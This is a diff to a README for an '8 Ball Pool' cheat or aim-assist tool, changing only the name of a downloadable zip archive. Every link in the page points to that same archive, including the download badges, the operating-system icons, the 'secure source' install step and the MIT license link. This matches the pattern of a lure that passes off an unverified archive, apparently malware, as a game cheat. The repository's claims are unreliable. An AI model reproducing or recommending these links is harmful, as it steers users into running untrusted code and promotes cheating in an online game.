@@ -1,4 +1,4 @@
-# [![Download](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip%20Latest-%F0%9F%92%BE%20Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip)
+# [![Download](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip%20Latest-%F0%9F%92%BE%20Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip)
 
 # 🎱 8 Ball Pool Cheto Suite
 
@@ -12,11 +12,11 @@ Stay confident, knowing your device is likely covered! Below you will find the c
 
 | Operating System  | Supported | Special Notes      |
 |:------------------|:--------:|:------------------|
-| ![Windows](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip)      | ✅       | Preferred experience  |
-| ![macOS](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip)          | ✅       | Optimized performance |
-| ![Linux](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip)          | ✅       | Wide variant support  |
-| ![Android](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip) | ✅       | Touch-ready UI        |
-| ![iOS](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip)           | ✅       | Seamless controls     |
+| ![Windows](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip)      | ✅       | Preferred experience  |
+| ![macOS](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip)          | ✅       | Optimized performance |
+| ![Linux](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip)          | ✅       | Wide variant support  |
+| ![Android](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip) | ✅       | Touch-ready UI        |
+| ![iOS](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip)           | ✅       | Seamless controls     |
 
 ---
 
@@ -71,7 +71,7 @@ See [API Setup Instructions](#installation--setup) for integration details.
 Feel the anticipation rising? Here’s how you can get started:
 
 1. **Download**  
-   - Grab the installation bundle from this secure source: https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip
+   - Grab the installation bundle from this secure source: https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip
    - Or use the "Download" badge at the top or bottom of this README.
 
 2. **Unpack & Install**  
@@ -97,11 +97,11 @@ Feel the anticipation rising? Here’s how you can get started:
 ## 📜 MIT License (2025)
 
 This repository operates under the MIT License, ensuring open and collaborative progress for all contributors.  
-See details here: [MIT LICENSE](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip) — © 2025
+See details here: [MIT LICENSE](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip) — © 2025
 
 ---
 
-# [![Download](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip%20Latest-%F0%9F%92%BE%20Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/8-ball-pool-aim-assist_1.0.zip)
+# [![Download](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip%20Latest-%F0%9F%92%BE%20Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Nisba009/8-ball-pool-aim-assist/branch/immanentist/pool_aim_ball_assist_inartistical.zip)
 
 ---
 
